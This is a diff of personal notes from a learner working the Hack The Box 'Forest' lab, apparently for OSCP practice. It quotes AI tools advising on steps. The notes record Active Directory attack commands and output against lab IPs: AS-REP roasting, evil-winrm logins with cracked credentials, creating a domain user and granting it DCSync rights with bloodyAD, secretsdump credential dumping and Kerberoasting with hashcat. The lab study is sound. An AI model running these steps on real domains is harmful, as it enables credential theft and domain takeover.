@@ -78,7 +78,7 @@ If they do, you can request a hash for their password without knowing their pass
 
 **Run this command:**
     impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.95.210 -request
-
+	
 - **If successful:** You will get a hash like `$krb5asrep$...`.
 - **If successful:** Save that hash to a file (e.g., `hash.txt`) and crack it with `hashcat` (Mode 18200).
 - **If it fails:** It means pre-auth is enabled for everyone, and we move to the next step.
@@ -150,3 +150,259 @@ yes. thx z.ai :)
 
 
     evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
+
+(pwns user flag)
+
+so, neat. asking z.ai for advice again.
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ =============================================
+htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
+HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+```
+
+
+z.ai output:
+
+This is exactly what we needed to see.
+
+**The Key Finding:** You are a member of **`BUILTIN\Account Operators`**.
+
+In Active Directory, the **Account Operators** group is a low-privileged admin group. Its intended purpose is to allow helpdesk staff to create user accounts and reset passwords.
+
+- **The Catch:** They usually **cannot** modify Administrators or Domain Admins.
+- **The Opportunity:** They _can_ modify other groups and users, which often leads to Privilege Escalation.
+
+Here is your two-pronged attack plan. We are going to try to abuse this membership.
+
+..okay, back again..
+
+we're going to use a "DCSync" attack. why?
+
+> Even though you are just an Account Operator, sometimes permissions are misconfigured, and this group can request password hashes from the Domain Controller (a DCSync attack).
+
+
+cool.
+
+
+    impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.19.75 -just-dc-ntlm
+
+???
+
+so,
+
+> No, you aren't missing a parameter. The error `ERROR_DS_DRA_BAD_DN` combined with the text "The distinguished name specified... is invalid" usually means **Permission Denied** in this context.
+
+
+> ### The Fix: Abuse "Account Operators"
+> Since you can't _steal_ the hashes directly, you must use your ability to _modify_ Active Directory objects.
+
+
+okay.
+
+
+
+```powershell
+
+evil-winrm -i 10.129.19.75 -u 'svc-alfresco' -p 's3rvice'
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user h4ck3r P@ssw0rd123! /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" h4ck3r /add /domain
+The command completed successfully.
+
+    
+```
+
+
+sweet that was easy.
+
+> Perfect. You now have a user (`h4ck3r`) inside the `Exchange Windows Permissions` group. This group has a special permission in Active Directory called **WriteDACL** on the Domain object itself.
+> This means `h4ck3r` is allowed to change the security rules of the entire domain.
+
+okay. epic.
+
+```
+### Step 2: Grant DCSync Rights
+
+# We are going to tell Active Directory: _"Allow user `h4ck3r` to replicate directory changes (i.e., perform a DCSync)."_
+
+pipx install bloodyad
+
+┌──(henrypost㉿kali-toughwolf)-[~/Git/oscp]
+└─$ bloodyAD --host 10.129.19.75 -d htb.local -u h4ck3r -p 'P@ssw0rd123!' add dcsync 'DC=htb,DC=local'       
+[+] DC=htb,DC=local is now able to DCSync
+
+
+
+# so, now we can dump secrets?
+  impacket-secretsdump htb.local/h4ck3r:'P@ssw0rd123!'@10.129.19.75 -just-dc-ntlm                                                                             
+# nope.
+
+  impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.19.75 -just-dc-ntlm      
+  
+# get sid
+  bloodyAD --host 10.129.19.75 -d htb.local -u h4ck3r -p 'P@ssw0rd123!' get object 'CN=h4ck3r,CN=Users,DC=htb,DC=local'                                              
+# ● The h4ck3r SID is S-1-5-21-3072663084-364016917-1341370565-10101. Looking at the domain ACL, I don't see this SID with DCSync rights. The bloodyAD approach may not have worked as expected.
+        
+okay.
+
+  Let's pivot to Kerberoasting - this is a classic AD attack that should yield results:
+                                                                                                                                                                       
+  impacket-GetUserSPNs htb.local/svc-alfresco:s3rvice@10.129.19.75 -request -outputfile kerberoast_hashes.txt                                                          
+
+  This will request Kerberos service tickets for accounts with SPNs. Then crack the hash:
+
+  hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+
+  OSCP Learning Point:
+  - Kerberoasting - Accounts with SPNs (Service Principal Names) have Kerberos tickets that can be requested and cracked offline. Service accounts often have weak
+  passwords.
+
+  ---
+  Alternatively, since we know the typical Forest box path, let's try a different ACL abuse with bloodyAD - give h4ck3r more direct permissions:
+
+  bloodyAD --host 10.129.19.75 -d htb.local -u h4ck3r -p 'P@ssw0rd123!' add acl 'DC=htb,DC=local' h4ck3r 'Replicating Directory Changes All'
+
+  Try either approach and let me know the results!
+    
+
+
+  impacket-GetUserSPNs htb.local/svc-alfresco:s3rvice@10.129.19.75 -dc-ip 10.129.19.75 -request -outputfile kerberoast_hashes.txt                                      
+  (we needed to specify the domain controller IP.)                                                                              
+
+```
+
+see setspn-output.md
+
+● Good find! This output shows only the Domain Controller (FOREST) has SPNs - no user/service accounts with SPNs are Kerberoastable. This is common in smaller AD      
+  environments.                                                                                                                                                        
+ 
+ - OSCP Learning Point: Not every AD domain has Kerberoastable accounts. If setspn -Q */* only shows machine accounts (HOST/xyz, ldap/xyz, etc.), Kerberoasting won't  work.
+
+
+```
+
+❯ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>   net group /domain                                                                                                 
+                                                                                                                                                                   
+                                                                                                                                                                       
+  Group Accounts for \\                                                                                                                                                
+                                                                                                                                                                       
+  -------------------------------------------------------------------------------                                                                                  
+  *$D31000-NSEL5BRJ63V7                                                                                                                                            
+  *Cloneable Domain Controllers                                                                                                                                    
+  *Compliance Management                                                                                                                                           
+  *Delegated Setup                                                                                                                                                 
+  *Discovery Management                                                                                                                                            
+  *DnsUpdateProxy                                                                                                                                                  
+  *Domain Admins                                                                                                                                                   
+  *Domain Computers                                                                                                                                                
+  *Domain Controllers                                                                                                                                              
+  *Domain Guests                                                                                                                                                   
+  *Domain Users                                                                                                                                                    
+  *Enterprise Admins                                                                                                                                               
+  *Enterprise Key Admins                                                                                                                                           
+  *Enterprise Read-only Domain Controllers                                                                                                                         
+  *Exchange Servers                                                                                                                                                
+  *Exchange Trusted Subsystem                                                                                                                                      
+  *Exchange Windows Permissions                                                                                                                                    
+  *ExchangeLegacyInterop                                                                                                                                           
+  *Group Policy Creator Owners                                                                                                                                     
+  *Help Desk                                                                                                                                                       
+  *Hygiene Management                                                                                                                                              
+  *Key Admins                                                                                                                                                      
+
+```
+
+okay. we can now try to add our h4ck3r user to a few groups.
+
+so. bloodhound would probably be the like. industrial solution, i think.
+
+net group "Exchange Trusted Subsystem" h4ck3r /add /domain
+net group "Group Policy Creator Owners" h4ck3r /add /domain
+
+they worked. now to login with impacket and pwn root flag?
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>   net user h4ck3r /domain
+ 
+User name                    h4ck3r
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/10/2026 10:34:27 AM
+Password expires             Never
+Password changeable          2/11/2026 10:34:27 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Exchange Windows Perm*Domain Users
+                             *Group Policy Creator *Exchange Trusted Subs
+The command completed successfully.
+
+```
+
+
+● h4ck3r doesn't have WinRM rights. Let's go straight to DCSync - the group membership should allow that:
+
+	  impacket-secretsdump htb.local/h4ck3r:'P@ssw0rd123!'@10.129.19.75 -just-dc-ntlm 
+
+    evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
+    
